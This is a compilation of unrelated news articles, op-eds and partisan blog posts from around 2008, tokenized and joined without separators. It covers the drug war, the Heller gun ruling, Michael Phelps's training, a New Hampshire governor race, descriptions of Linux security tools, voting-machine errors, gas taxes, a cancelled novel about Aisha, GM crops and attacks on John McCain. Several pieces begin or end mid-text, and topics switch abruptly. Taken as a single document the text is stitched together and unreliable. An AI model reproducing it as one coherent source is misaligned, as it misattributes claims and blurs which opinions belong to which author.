Scarcely any critical commentator on the “ war on drugs ” has failed to remark on the striking inconsistencies that permeate the current prohibitionist stance .
Contemporary crusaders for social purity ardently seek to outlaw X ( e.g. , marijuana ) , yet they cheerfully abide Y ( e.g. , Chardonnay ) , whose consumption is at least as harmful and in some cases is manifestly more so .
How are we to make sense of such blatant contradictions ?
We can see a pattern in the apparent incoherence of the prohibitionists ’ position if we recall that the war on drugs , like all the preceding prohibitionist crusades in American history ( some of them still continuing ) , amounts to a defense of bourgeois WASP conventions against persons and classes deemed less respectable .
So , SSRIs , yes , ecstasy , no ; Benzodiazepines , yes , heroin , no ; a pleasant cocktail party , yes , reefer madness , no ; and so forth .
Everything turns on the sort of people who tend to consume the substance .
The better sorts have been waging war for centuries to keep the rabble in line .
The self - anointed “ respectable ” people live in constant anxiety that their beloved way of life faces mortal menace from the disorderly masses , who may be disinclined to toe the line drawn for them .
As David Wagner has written in The New Temperance : The American Obsession with Sin and Vice , “ the Victorian and Progressive Period movements [ to ban alcoholic beverages and tobacco cigarettes , among other things ] were characterized by what scholarly observers consider an exaggerated . . . notion of their ability to change behavior , by a huge faith in government ’s ability to regulate every aspect of private life , and by a strong ethnocentric belief in the correctness of white , Protestant , middle - class social norms . ”
The Progressive Era ended , thank heaven , but this twisted puritanical obsession endured .
Combine this priggish insecurity and moral pomposity with the ideological appeal of the modern therapeutic state and the irresistible attractions of money and power to be seized when governments at every level throw their vicious violence onto the scales , and you have an insoluble social problem — insoluble because the drugs are only a symptom of the underlying class warfare in which those with the bigger political battalions are constantly tempted to wage preemptive strikes against their " unruly " neighbors , especially if those neighbors are black , brown , red , yellow , poor , foreign - born , adherents of an " alien " religion , or in some other visible respect " strange . "
I was struck most recently by this phenomenon while reading — of all things — a catalog sent by the University of Oklahoma Press , where I came upon the announcement of a book by James E. Klein , Grappling with Demon Rum : The Cultural Struggle over Liquor in Early Oklahoma , to be published in October .
( Full disclosure : I was born in Oklahoma , and although my family emigrated from that place when I was seven years old , I am charmed by the idea that books are published there . )
Oklahoma banned liquor when it became a state in 1907 , and it remained dry until 1959 , long after national prohibition had been terminated in 1933 .
According to the summary of Klein ’s book , prohibition ’s original proponents in the Sooner State “ were largely middle - class citizens who disdained public drinking establishments and who sought respectability for a young state still considered a frontier society . ”
They purportedly aimed “ to raise moral standards , reduce crime , and improve the quality of life , ” among other things .
Notwithstanding these uplifter ’s best efforts , however , the lesser sorts stood steadfastly by their booze .
Klein points “ to the large number of working - class Oklahomans who patronized saloons , whether legal or not , and focuses on class conflict in the early efforts to control alcohol . ”
The book ’s advertisement concludes : “ In portraying this conflict between middle - and working - class definitions of social propriety , Klein provides new insight into forces at work throughout America during the Progressive Era . ”

Supreme Court Rules that Individuals Have the Right to Bear Arms
By a 5 - 4 majority the supreme court has upheld an individual ’s right to keep and bear arms by ruling the 30 + year Washington DC ban of all handguns unconstitutional .
This is a major although slim ruling by the supreme court as it is the first time in this country ’s history that the supreme court has ruled that the second amendment applies to individuals and not just militias .
Justice Antonin Scalia said for the majority the Second Amendment protects an individual right to possess a firearm unconnected with militia service and to use it for traditional lawful purposes , such as self - defense in the home .
The court did rule that some restrictions were okay however .
He said the ruling should not be taken to cast doubt on long - standing prohibitions on the possession of firearms by felons and the mentally ill or on laws forbidding the carrying of firearms in places like schools and government buildings or laws imposing conditions on gun sales .
So while I am celebrating the fact that the supreme court actually upheld the constitution for a change , there is still work to be done .
No , I am not talking about rescinding the above prohibitions on felons owning guns , but the slim majority of this decision does leave the door open for future cases .
We were just one vote away from the supreme court ruling that the second amendment did n’t apply to individuals .
One Ruth Bader Ginsburg vote away from the supreme court ruling that the second amendment did n’t apply to individuals .
In other words , one Barack Obama supreme court nominee away from ruling that the second amendment did n’t apply to individual .
Catch my drift ?
If the next president has a supreme court seat to fill this whole decision could be thrown out the door .
Hell , I do n’t trust John McCain with this process either .
Neither of these men as president will nominate a John Stevens or Sam Alito to the supreme court .
This is where my concern lies .
By the supreme court ruling that SOME restrictions are okay it leaves the door open for MORE restrictions .
This issue will be brought before the court again and with a McCain or Obama supreme court all bets are off on this issue .
More and more restrictions could be found to be constitutional .
So while I celebrate the supreme court upholding the constitution today I fear for the constitution tomorrow under either a President Obama or President McCain .
This ruling makes me feel good , the margin of victory leave my stomach just a little queasy .
When I visited Colorado Springs in mid-May , Bowman was wrapping up a three - week high - altitude training stint with Club Wolverine , the elite Ann Arbor , Mich. , swimming organization at which he bears the title High Performance Coach and whose members include Phelps .
( From 2004 until his resignation earlier this year , Bowman was also the head coach of the University of Michigan ’s swim team ; Phelps followed Bowman to Ann Arbor from his native Baltimore . )
Training in thin air is a proven and perfectly legal means of boosting an athlete ’s red - blood - cell count , which increases the oxygen delivered to muscles .
The trip also afforded Bowman , who prefers to start his day at around 4 a.m. , the opportunity to lead his crew through a final pre-Olympic - trials boot camp .
The schedule for the Colorado sojourn featured three sessions in the pool per day and an additional hour of “ dry land ” activities like weight training or Pilates , for a total of 70 workouts in three weeks .
Although Bowman was dedicated to mixing up the training regimen to keep his swimmers from getting comfortable , he followed certain patterns : the early session featured 90 minutes of low - key , continuous aerobic exertion  three or four miles of wake - up laps .
Midday practice was an intense two - hour affair , putting the swimmers through their paces at top speeds or at the very threshold of their endurance ; dry - land work followed for an hour .
Later in the afternoon , the day ’s final workout focused on muscle power rather than lung power , featuring drills with parachutes , fins , paddles , kick boards , floats , limb - disabling bands , snorkels and other accouterments designed to isolate particular skills .
Bowman could be sure that his swimmers had little time or energy left at the end of the day for anything but eating , sleeping and occasionally slumping in front of the television .
Phelps , who is said to require 8,000 to 10,000 calories a day to sustain his efforts , spent much of his free time napping or in pursuit , as he puts it , of “ whatever I want to eat , whenever I want it , however much I want . ”
The practice I attended was what Bowman termed a farewell swim : the two dozen team members would be packing their bags afterward and heading to Santa Clara , Calif. , before dawn the next morning for a meet .
Consequently , Bowman had designed a feel - good wind - down session , featuring lap after lap at what he called a low - intensity “ white pace , ” at which swimmers maintain heart rates of around 130 beats per minute .
( Trained swimmers have heart rates that are much lower both at rest and at maximum exertion than those of ordinary fit people . )
The swimmers seemed to drift by in slow motion , plying their backstroke with languid windmill motions , then moving on to freestyle , bending their elbows and dropping their forearms through the water ’s surface , hatchet - style , then rising and falling from the pool with their breaststroke and butterfly .
Music played over a loudspeaker , but the sound bounced off the water and the walls so haphazardly that it registered as an indistinct blare .
Phelps blended into the mix with the others  he was surrounded by other prospective Olympians , including Erik Vendt , Peter Vanderkaay and Allison Schmitt  and wore the kind of detached expression befitting someone who had done much the same thing most of the days of his life .
“ You ’ve got to understand how monotonous and boring our training is , ” Bowman told me .
“ And hard . ”
On several occasions , I watched as Phelps tried to irk Bowman  as Bowman predicted he would  by tugging on the lane divider during kicking exercises .
“ Michael knows it ’s one of the things I absolutely hate most , ” Bowman said .
“ When he first started doing it , I went nuts , and it wasted our time .
It ’s just a way he has of asserting his independence from me  a stupid way .
I ’ve decided that for now I ’m going to pick my battles and ignore it . ”
After 40 minutes , Bowman had his swimmers increase their intensity to a “ pink pace , ” their heart rates rising to around 150 beats per minute .
The swimmers grew more serious , and it was clear that many were focused on racing their teammates in adjacent lanes .
Phelps seemed indifferent to the contest and allowed others to beat him to the wall .
It was n’t until Bowman called for a “ red pace ”  around 165 beats per minute  that Phelps , swimming freestyle , poured on his power and broke away from surrounding swimmers by several lengths .
Afterward , he climbed out of the pool , grabbed his phone and , I surmised , began sending text messages .
He looked no more winded than if he had been skimming the pool ’s surface on an inflatable raft .
The crux of Phelps ’s superiority  the quality that allows him to maintain the power and efficiency of his strokes when other swimmers begin to falter and that allows him to overpower competitors in the final lap of a race  is his endurance .
Years of Bowman ’s drills have developed and refined Phelps ’s capacity to endure , but from the outset Phelps brought to the pool physiological attributes that place him at the limit for his species .
Under aerobic strain , Phelps produces far less lactic acid than other athletes .
There is considerable controversy over whether lactic acid itself is detrimental to athletic performace , but it is known that elevated levels of lactic acid are accompanied by a suite of other metabolic products  hydrogen ions , inorganic phosphates  that interfere with muscle contraction and are the stuff of ruinous fatigue .
Phelps and other swimmers are continually tested to measure their blood lactate levels ( the lower they are , the better a body ’s state of aerobic conditioning ) and to determine the rate at which they clear lactate from their systems , which indicates their ability to recover .
Bowman , who is unapologetically secretive , wo n’t reveal Phelps ’s results , but some data have leaked out over the years , and they have become the stuff of swimming lore .
After he set a world record in the 100 - meter butterfly in 2003 , Phelps ’s blood lactate level was an absurdly low 5.6 millimoles per liter of blood , one - half to one - third that of other elite swimmers .
At competitions during which Phelps has raced multiple events in quick succession , he has been known to clear lactate from his blood while racing .
He also has the ability to tolerate high levels of blood lactate  to swim at full strength and speed while carrying a load of lactate that would bring other athletes to a relative crawl .
It ’s part of Phelps ’s recipe for flourishing beyond all reasonable expectations in water .
Genadijus Sokolovas , an intense former pentathlete from Lithuania who is the sports - science director for USA Swimming , explained to me how important this is : “ I recently calculated how much Michael is going to swim in Beijing .
We do n’t know his final schedule yet , but if it ’s similar to Athens , the total time he ’ll spend in the water  preliminaries , semifinals , finals , warm - ups , cool - downs  will be the equivalent of running eight or nine marathons over the course of the Olympic Games . ”

The next morning , I returned to the pool , where I found Sokolovas standing on the deck in front of a bank of electronic equipment , administering what he called a “ swim - power test ” to a specialist in the butterfly from Indiana University .
The swimmer wore a belt around his waist from which a fishing line transmitted measurements of velocity and force 60 times each second ; at the same time , a camera mounted on a track on the pool wall followed him down the lane and another camera filmed him from below .
The apparatus , which Sokolovas developed , analyzes a swimmer ’s effectiveness according to 25 to 30 different parameters and gives coaches a way to quantify the costs of a swimmer ’s mechanical flaws .
“ Before this , ” Sokolovas said , “ we were just guessing  high elbow position is better than low elbow position , or pulling in the middle is better than pulling from the side .
Now we can test any hypothesis . ”
( Bowman does not allow Sokolovas to share specific results of any testing he has performed on Phelps . )
Sokolovas is a sporting objectivist and regards Phelps and other members of the mystical vanguard of athletes with an unsentimental gaze .
“ Working on his technique with Coach Bowman for so many years , ” Sokolovas said , “ definitely helped Phelps develop a very efficient way to generate his velocity curve on these graphs , and years of high - volume swimming really developed his aerobic conditioning .
But , ” he continued , “ I ’m pretty sure we have many more Michael Phelpses in this country . ”
Sokolovas noted , with some frustration , that the United States lacks the kind of organized system of talent identification that other countries use to start developing athletes in early childhood .
“ There are plenty of methods we can use to evaluate a child , ” he said .
“ We can look at their biological parents and project their anthropometric parameters ; we can evaluate their aerobic ability by testing their maximum oxygen output or measuring their aortas .
We can test how fast they adapt to long - term training .
It ’s easy to evaluate , but instead we rely on the athlete coming to us , the way Michael Phelps came to Bob Bowman . ”
In that case , I asked , how likely are we ever to see the likes of Phelps again ?
Sokolovas brushed aside my question .
“ I ’m pretty sure his records will be broken in 5 to 10 years .
The swimmers who are going to do this are already in the system . ”
Does n’t human potential eventually hit a wall ?
“ No , ” he replied .
“ There is no point at which athletes ca n’t continue to improve .
You can always do higher - intensity training , or maybe higher volumes .
A swimmer can do more training on land ; or more strength training in water , like swimming against resistances .
You can improve your technique .
You can improve your nutrition .
Basically , I do n’t see any limits in swim performance .
We ’ll never build the perfect swimmer .
The records will go up and up . ”

New Hampshire Governor Refuses to Agree to a Campaign Spending Cap
Today was the last day to file if a person decided to run for office in New Hampshire .
No more Republicans filed so our nominee is Joe Kenney .
Joe Kenney agreed to a voluntary campaign spending cap of $ 1.2 million and he challenged our liberal spend - aholic governor to do the same .
He refused .
Big fucking surprise there .
Governor Lynch has no problem spending money as we have learned the hard way in New Hampshire .
If he had agreed to an actual spending cap it would have been the first fiscally responsible thing this man has done since becoming governor .
Here is what Joe Kenney said about signing the speding cap pledge :
“ I want to make this about people , not about money , ” Kenney said .
“ By taking the spending limit cap on my campaign I am also illustrating what I would do as governor .
I will implement real spending limits in our state budget as well . ”
Governor Lynch on the other hand would rather raise and spend money than make the candidacy about people .
Joe Kenney went on to attack Governor Lynch for his miserable spending record :
He attacked Lynch for lack of fiscal discipline , referring to him as a multi-millionaire several times .
He said he has hurt the state with increases in taxes and fees , and for signing a two - year budget that increased spending by $ 500 million .
He also criticized introduction last week of a $ 90 million borrowing bill that Democrats passed without any public hearing .
“ We need to get the reins and a hold on the New Hampshire budget , ” Kenney said .
“ We need to keep New Hampshire , New Hampshire , ”
To which the teflon governor replied :
“ We will continue to be fiscally responsive but at same time be sure we are addressing the needs of our most vulnerable citizens , ”
He still tries to claim he is fiscally responsible .
I am getting sick and tired of this man playing me and all New Hampshire residents as fools .
How fucking stupid does he think we are ?
Fiscally responsible , what a joke .
This man is a fool .
Or rather , he is playing us for fools .
Here is a little more information on Joe Kenney :
“ Someone has got to take on John Lynch and I ca n’t think of any other better person than a U.S. Marine who grew up in this state , ” he said .
“ I learned long ago that no one is unbeatable . ”
Kenney , a legislator for 14 years including the last six in the Senate , is a U.S. Marine Corps Reserve lieutenant colonel who has been called up twice since the war in Iraq began .
He is a 1984 graduate of the University of New Hampshire .
He pledged to veto any sales or income tax , and has signed a pledge to keep state spending within the rate of regional inflation .
He said he will cut spending and improve government efficiency , reduce energy costs by blocking the Regional Greenhouse Gas Initiative , boost job growth and business recruitment , and push for a full - service hospital for veterans .
John Lynch has also pledged to veto a sales or income tax , but he knows with a Democrat majority in the state house and senate his veto will be overturned and he will get what he truly wants , a sales or income tax .
Maybe both .
And in typical John Lynch fashion , his name wo n’t technically be attached to it .
The teflon governor strikes again .

Do you have a favorite security software tool for Linux ?
Feel free to comment and tell us about it .
Random Entries : Hacking Windows Passwords
2. Nmap is my favorite network security scanner .
It is used to discover computers and services on a computer network , thus creating a " map " of the network .
Just like many simple port scanners , Nmap is capable of discovering passive services on a network despite the fact that such services are n't advertising themselves with a service discovery protocol .
In addition Nmap may be able to determine various details about the remote computers .
These include operating system , device type , uptime , software product used to run a service , exact version number of that product , presence of some firewall techniques and , on a local area network , even vendor of the remote network card .
Nmap runs on Linux , Microsoft Windows , Solaris , and BSD ( including Mac OS X ) , and also on AmigaOS .
Linux is the most popular nmap platform and Windows the second most popular .
3 . Nessus is a comprehensive vulnerability scanning software .
Its goal is to detect potential vulnerabilities on the tested systems such as : - Vulnerabilities that allow a remote cracker to control or access sensitive data on a system .
-Misconfiguration ( e.g. open mail relay , missing patches , etc ) .
- Default passwords , a few common passwords , and blank / absent passwords on some system accounts .
Nessus can also call Hydra ( an external tool ) to launch a dictionary attack .
-Denials of service against the TCP / IP stack by using mangled packetsNessus is the world 's most popular vulnerability scanner , estimated to be used by over 75,000 organizations worldwide .
It took first place in the 2000 , 2003 , and 2006 security tools survey from SecTools .
Org.4. chkrootkit ( Check Rootkit ) is a common Unix - based program intended to help system administrators check their system for known rootkits .
It is a shell script using common UNIX / Linux tools like the strings and grep commands to search core system programs for signatures and for comparing a traversal of the / proc filesystem with the output of the ps ( process status ) command to look for discrepancies .
It can be used from a " rescue disc " ( typically a Live CD ) or it can optionally use an alternative directory from which to run all of its own commands .
These techniques allow chkrootkit to trust the commands upon which it depend a bit more .
There are inherent limitations to the reliability of any program that attempts to detect compromises ( such as rootkits and computer viruses ) .
Newer rootkits may specifically attempt to detect and compromise copies of the chkrootkit programs or take other measures to evade detection by them .
5 .
Wireshark is a free packet sniffer computer application used for network troubleshooting , analysis , software and communications protocol development , and education .
In June 2006 , the project was renamed from Ethereal due to trademark issues .
The functionality Wireshark provides is very similar to tcpdump , but it has a GUI front - end , and many more information sorting and filtering options .
It allows the user to see all traffic being passed over the network ( usually an Ethernet network but support is being added for others ) by putting the network interface into promiscuous mode .
Wireshark uses the cross-platform GTK + widget toolkit , and is cross-platform , running on various computer operating systems including Linux , Mac OS X , and Microsoft Windows .
Released under the terms of the GNU General Public License , Wireshark is free software .
6. netcat is a computer networking utility for reading from and writing to network connections on either TCP or UDP .
Netcat was voted the second most useful network security tool in a 2000 poll conducted by insecure.org on the nmap users mailing list .
In 2003 , it gained fourth place , a position it also held in the 2006 poll .
The original version of netcat is a UNIX program .
Its author is known as * Hobbit * .
He released version 1.1 in March of 1996 .
Netcat is fully POSIX compatible and there exist several implementations , including a rewrite from scratch known as GNU netcat .
7 .
Kismet is a network detector , packet sniffer , and intrusion detection system for 802.11 wireless LANs .
Kismet will work with any wireless card which supports raw monitoring mode , and can sniff 802.11a , 802.11 b and 802.11g traffic .
Kismet is unlike most other wireless network detectors in that it works passively .
This means that without sending any loggable packets , it is able to detect the presence of both wireless access points and wireless clients , and associate them with each other .
Kismet also includes basic wireless IDS features such as detecting active wireless sniffing programs including NetStumbler , as well as a number of wireless network attacks .
8 . hping is a free packet generator and analyzer for the TCP / IP protocol .
Hping is one of the de facto tools for security auditing and testing of firewalls and networks , and was used to exploit the idle scan scanning technique ( also invented by the hping author ) , and now implemented in the Nmap Security Scanner .
The new version of hping , hping3 , is scriptable using the Tcl language and implements an engine for string based , human readable description of TCP / IP packets , so that the programmer can write scripts related to low level TCP / IP packet manipulation and analysis in very short time .
Like most tools used in computer security , hping is useful to both system administrators and crackers ( or script kiddies ) .
9 . Snort is a free and open source Network Intrusion prevention system ( NIPS ) and network intrusion detection ( NIDS ) capable of performing packet logging and real - time traffic analysis on IP networks .
Snort performs protocol analysis , content searching / matching , and is commonly used to actively block or passively detect a variety of attacks and probes , such as buffer overflows , stealth port scans , web application attacks , SMB probes , and OS fingerprinting attempts , amongst other features .
The software is mostly used for intrusion prevention purposes , by dropping attacks as they are taking place .
Snort can be combined with other software such as SnortSnarf , sguil , OSSIM , and the Basic Analysis and Security Engine ( BASE ) to provide a visual representation of intrusion data .
With patches for the Snort source from Bleeding Edge Threats , support for packet stream antivirus scanning with ClamAV and network abnormality with SPADE in network layers 3 and 4 is possible with historical observation .
10 .
tcpdump is a common computer network debugging tool that runs under the command line .
It allows the user to intercept and display TCP / IP and other packets being transmitted or received over a network to which the computer is attached .
In some Unix - like operating systems , a user must have superuser privileges to use tcpdump because the packet capturing mechanisms on those systems require elevated privileges .
However , the - Z option may be used to drop privileges to a specific unprivileged user after capturing has been set up .
In other Unix - like operating systems , the packet capturing mechanism can be configured to allow non-privileged users to use it ; if that is done , superuser privileges are not required .
The user may optionally apply a BPF - based filter to limit the number of packets seen by tcpdump ; this renders the output more usable on networks with a high volume of traffic .
COLUMBUS , Ohio ( AP ) 
A major voting machine maker has notified its customers in 34 states that a programming error discovered during testing may cause votes to be dropped when they are uploaded to a computer server from the machines ' vote - holding memory cards .
Premier Election Solutions Inc. supplies touch - screen voting systems as well as scanners for paper ballots to large and small customers throughout the nation .
The error communicated in a Tuesday product advisory occurs when multiple memory cards are being uploaded at the same time , and it is more likely to occur in jurisdictions that have several voters and use touch - screen voting systems , said Premier spokesman Chris Riggall .
The Allen , Texas - based Premier is a unit of North Canton - based Diebold Inc .
More voters and more touch - screen machines mean more memory cards .
Each individual touch - screen machine has a memory card , and scanning machines that read thousands of paper ballots each only have one card .
In Ohio , where the glitch was discovered , it caused at least 1,000 total votes to be dropped in nine of the 44 counties that used Premier 's equipment during the March presidential primary and previous elections .
The dropped votes were discovered within several hours by election officials who noticed the memory cards were n't being read properly .
Workers re-fed the cards into the server until they worked , and the votes were added to the overall vote totals .
Errors that did not produce dropped votes were discovered in three other counties .
The company had previously blamed the problem solely on complications with an antivirus software .
Officials in Ohio's Butler County kept testing the machines and claimed that there was a problem with the machines themselves .
That was later verified by Premier 's own testing , which prompted the company to send out a product advisory to all of its customers .
The company said that antivirus software can cause the error , but that the programming glitch can produce the error even when the software is n't used .
" We are communicating to customers around the country , making sure that we 're answering any questions concerning it , " Riggall said .
Ohio will continue to use the Premier machines in the Nov. 4 election .
Secretary of State Jennifer Brunner said identifying the cause of the problem will enable the state to prepare election officials to watch for the problem and correct it should it resurface .
Premier said in its product advisory that the problem can be corrected as long as officials monitor whether the memory cards are being uploaded , and if they are not , reload them until they are .
" We are finalizing plans that will walk board officials through the process of identifying the problem , loading the affected memory cards and verifying that the votes are counted , " said Brunner spokesman Kevin Kidder .
The company and state election officials said there are multiple layers of security in place , such as post - election audits that match voting machine totals with a paper trail , that will ensure that no votes are missed .
Cuyahoga County , Ohio's largest county and the home of Cleveland , dropped Premier touch - screen systems in 2007 after the system malfunctioned .
The company sued the county for breach of contract .
Brunner then countersued , citing the dropped votes that the company acknowledged in its letter to Brunner this week .
Premier spokesman Riggall said he could not comment on the lawsuit .

It pains my pocketbook to say this , but America needs $ 4 - a - gallon gasoline .
That includes Michigan 's auto industry .
As I write this , oil is trading around $ 120 a barrel , down nearly $ 27 from its July 11 peak .
AAA Michigan said Monday that state gasoline prices dropped 22 cents a gallon in the previous week .
OPEC President Chakib Khelil said Tuesday that the price of oil could drop to $ 70 a barrel because of falling U.S. demand and a strengthening American dollar .
Great news , right ?
Not really .
Yes , plunging crude oil and gasoline prices would be a boon to motorists .
Lower oil prices would likely lead to falling food prices and aid auto suppliers , especially those who produce parts from petroleum - based plastics .
But many experts say the price break likely is temporary .
Rising worldwide demand for oil likely will boost gas prices in the long term , maybe well above $ 4 a gallon .
Bumpy ride
Planning executives at Detroit 's automakers must be pulling their hair out over wildly fluctuating oil prices .
When $ 140 - a - barrel oil destroyed sales of full - size pickups and SUVs in May and June , General Motors Corp. and Ford Motor Co. took radical steps to shift production away from trucks to cars .
GM 's future car - laden product plan is based on oil prices rising to as high as $ 150 a barrel by next year .
But what if oil falls to $ 70 a barrel and gasoline drops to about $ 2 a gallon ?
Demand for big SUVs could again rise , forcing automakers to reallocate billions of dollars they just shifted to development of new cars back to trucks .
That is not exactly helpful to bottom lines already bleeding red ink .
A reprieve in oil prices also would hurt efforts to develop alternative energies that make us less dependent on foreign oil and reduce harmful greenhouse gases .
That has happened before .
Steve Pueppke , director of Michigan State University 's Office of Biobased Technologies , says alternative energy research spawned by the oil shocks in the 1970s dried up when oil prices later fell .
Michigan and the rest of the country need gasoline to stay at $ 4 a gallon , even if the price of oil drops rapidly in the coming months .
Raise fuel taxes
State and federal governments should create a floor of $ 4 gas by raising fuel taxes .
Increased tax revenues should be used to fund alternative - energy research , provide relief to low - income families struggling with high gas prices , and rebuild crumbling bridges and highways .
One of every four of the nation 's bridges is in need of repair or replacement at a cost of $ 140 billion , according to a report released Monday by the American Association of State Highway and Transportation Officials .
We can pay now to break our addiction to oil or pay later , when the cost will be much higher .

Salman Rushdie accused Random House , which has also published several of his books , of giving in to intimidation .
" I am very disappointed to hear that my publishers , Random House , have cancelled another author 's novel , apparently because of concerns about possible Islamic reprisals , " said Rushdie , as reported by Britain 's The Times Online .
" This is censorship by fear and it sets a very bad precedent indeed . "
Rushdie has faced the wrath of the Muslim world
Rushdie caused uproar in the Islamic world in 1988 with what was perceived as a blasphemous depiction of Mohammed in his book The Satanic Verses .
He spent years in hiding after Iran 's Ayatollah Khomeini issued a death edict .
Harmony versus free speech
The currently disputed book by American journalist Sherry Jones , The Jewel of Medina , is a fictional account of the life of Mohammed 's wife Aisha , from her engagement to him at the age of six to the prophet 's death .
After sending out advance copies of the book , which was scheduled for publication this month , Random House was advised that it " could incite acts of violence by a small , radical segment , " said the publisher in a statement .
The book 's cancellation is the latest move in the delicate dance between the Islamic world and the Western tradition of free speech .
The reprinting of the Mohammed cartoons sparked protest again this year
In 2004 , for example , Dutch filmmaker Theo van Gogh was murdered after completing a documentary on women in Islam .
And in 2005 the publication of Mohammed caricatures in Denmark sparked violent protests in Muslim countries around the world .
The Danish cartoonist Kurt Westergaard , who has received death threats for his controversial drawings , spoke out against the decision to halt the publication of Jones ' novel .
" One of the really big publishing houses has backed down , " he told Danish news agency Ritzau .
" That 's not a good sign . "
Voices of warning
The loudest voice of protest against the novel , however , did not come from a fundamentalist Islamic group , but from an American university professor .
Denise Spellberg , associate professor of Middle Eastern studies at the University of Texas at Austin , was given a copy of the book for review prior to publication and she did n't approve of Jones ' portrayal of Mohammed 's child wife .
" I felt it my duty to warn the press of the novel 's potential to provoke anger among some Muslims , " wrote Spellberg in a letter to the Wall Street Journal .
The book may still be published elsewhere
She added that the book counted on " stirring up controversy to increase sales . "
Serbian publisher Beobook was to be the first worldwide company to publish a translation of Jones ' book after the US debut .
Beobook announced over the weekend that it , too , had pulled the title .
The decision was welcomed by Serbia 's Muslim political party .
" It is a good move to lower tensions in multi- confessional Serbia , " Mirsad Jusufovic of the Sandzak Democratic Party told Beta news agency .
Prince Charles has his own organic farm at his Gloucestershire estate
The environment minister has challenged Prince Charles to prove his claim that GM crops could cause a global environmental disaster .
In an interview with the Sunday Telegraph , Phil Woolas said it was now down to the opponents of genetically modified food to prove it was unsafe .
" If it has been a disaster then please provide the evidence , " he said .
On Wednesday Prince Charles said firms developing GM crops risked the biggest environmental disaster " of all time " .
The government 's initial response to the prince 's comments in sister paper the Daily Telegraph was to say that it welcomed all voices in the " important " debate and that safety was a priority .
' Africa strategy '
However , on Sunday Mr Woolas went further , saying it was the government 's " moral responsibility " to investigate whether genetically modified crops could help provide a solution to hunger in the developing world .
" We see this as part of our Africa strategy , " he said .
" It 's easy for those of us with plentiful food supplies to ignore the issue but we have a responsibility to use science to help the less well off where we can .
" I 'm grateful to Prince Charles for raising the issue .
He raises some very important doubts that are held by many people .
[ A ] gigantic experiment with nature and the whole of humanity which has gone seriously wrong
Prince of Wales
Analysis : Is the Prince right ?
Send us your comments
" But government ministers have a responsibility to base policy on science and I do strongly believe that we have a moral responsibility to the developing world to ask the question : can GM crops help ? "
Earlier this week the Prince of Wales warned future reliance on corporations to mass produce food would drive millions of farmers off their land .
He said huge multi-national corporations involved in developing GM foods were conducting a " gigantic experiment with nature and the whole of humanity which has gone seriously wrong " .
What should be debated was " food security not food production " , he said .
The prince 's comments come at a time of rising world food prices and food shortages .
The biotech industry says that GM technology can help combat world hunger and poverty by delivering higher yields from crops and also reduce the use of pesticides .
However , green groups and aid agencies have doubts about GM technology 's effectiveness in tackling world hunger and have concerns about the long - term environmental impact .

What are these ?
But John McCain does n't think that way .
For McCain every crisis is 1939 and every threat is existential .
As Max has so aptly pointed out , this is a very dangerous approach to the world .
But Iran is n't the Nazis or the Soviet Union .
The Soviet Union had thousands of nuclear weapons and controlled all of Eastern Europe .
The Nazis took over all of Europe and killed millions .
Iran is a country with 60 million people and a GDP the size of Florida .
By historical comparison it is simply not the same level threat .
In terms of McCain 's ad .
The whole point is to elevate the Iranian threat to some ridiculous level of fear and paranoia equivalent to the Nazis or the Soviet Union .
First of all , the quote is of course completely out of context .
Obama clearly takes Iran seriously .
All you have to do is read his policies and listen to his positions .
John McCain .
He was a cheerleader for George Bush and Dick Cheney 's war in Iraq .
He has said we should bomb Iran .
He 's willing to get into major escalations with China and Russia .
He thought war with North Korea was inevitable .
He even called Germany and France our " adversaries . "
Is that who we want leading our country ?
John McCain too reckless to lead ( You can see supporting facts below the fold ) .
John McCain has an ad up trying to scare the American people about Iran and saying Obama does n't take the threat seriously enough .
I think it 's time to take the gloves off and paint McCain as the reckless and dangerous overeager warrior that he is .
Iraq
McCain : Iraq would be a nuclear assembly line for Al Qaeda .
“ Iraq and al - Qaeda present the United States with enemies on multiple fronts .
In World War II , when the Japanese bombed Pearl Harbor , we went to war -- against them and against the Nazis , who had not attacked our homeland .
We did not have the luxury of fighting one enemy at a time .
Sept. 11 , 2001 showed that al - Qaeda is a grave threat .
Saddam Hussein has the ability to make a far worse day of infamy by turning Iraq into a weapons assembly line for al - Qaeda 's network .
Does anyone really want to vouch for Saddam , a pathological risk - taker with a history of violent aggression and an enormous stockpile of the world 's worst weapons , when terrorists could help him attack us without fingerprints ?...
Standing by while an odious regime with a history of support for terrorism and hostility to America develops weapons whose use by terrorists could kill millions of Americans is not a choice .
It is an abdication … Saddam is an international felon who has repeatedly violated the terms of his parole and is planning further crimes with his terrorist accomplices .
He must be brought to justice once and for all .
[ USA Today 2/13/03 ]
McCain called for rushing to war – thought Iraq “ threat ” was incredibly urgent – few months before said war would be “ easy ” because Saddam was weak .
In calling for the immediate invasion of Iraq , McCain wrote in the USA Today , “ It is in the nature of democracies to be patient .
But as history has shown , they can delay to their peril . ”
But McCain just a few months before said Iraq was weak , " I am very certain that this military engagement will not be very difficult .
It may entail the risk of American lives and treasure , but is vastly weaker than he was in 1991 . "
[ USA Today 2/13/03 .
NY Times , 9/13/02 ]
Iran
McCain : “ Bomb , Bomb , Bomb Iran . ”
In April 2007 , McCain , speaking to voters in South Carolina , responded to a question about Iran by singing “ Bomb , bomb Iran ” to the tune of the Beach Boys ’ “ Barbara Ann . ”
A man had asked McCain about sending “ an air mail message to Tehran . ” McCain answered by singing , “ Bomb bomb bomb , bomb bomb Iran . ”
He then added : “ Iran is dedicated to the destruction of Israel .
That alone should concern us , but now they are trying for nuclear capabilities .
I totally support ( President George W. Bush ) when he says we will not allow Iran to destroy Israel . ”
[ UPI , 4/19/07 ]
Days after 9/11 and before U.S. forces had even invaded Afghanistan after , McCain was focused on attacking countries that had nothing to do with 9/11 – Iraq , Iran , Syria – said picking which one would be the tough part .
“ That 's where the tough part of this whole scenario is going to begin .
And that is that , after the Taliban are overthrown -- which I believe they will be -- I have very little doubt in my mind -- after bin Laden is either taken prisoner or killed and his network is destroyed , then what 's next ?
Obviously , Iraq is still bent on -- Saddam Hussein is still bent on developing weapons of mass destruction .
Obviously , the Iranians are still supporting terrorist organizations , as are the Syrians .
That 's where the tough choices and decisions are going to be made . ”
[ MSNBC , Hardball , 10/3/01 ]
North Korea
McCain thought war with North Korea was inevitable in 1994 .
" In a chilling message to colleagues on the eve of Memorial Day , Sen. John McCain , R - Ariz . , warned that a major war with North Korea is inevitable unless America finds a way to deter Kim Il Sung , a dictator bent on crashing the nuclear club and unleashing weapons of mass destruction around the world . "
The Oregonian ( Portland , Oregon ) , May 30 , 1994
Russia and China
McCain said “ we are all Georgians now , ” implying he would be willing to take a much more confrontational approach to Russia .
[ Washington Post , 8/12/08 ]
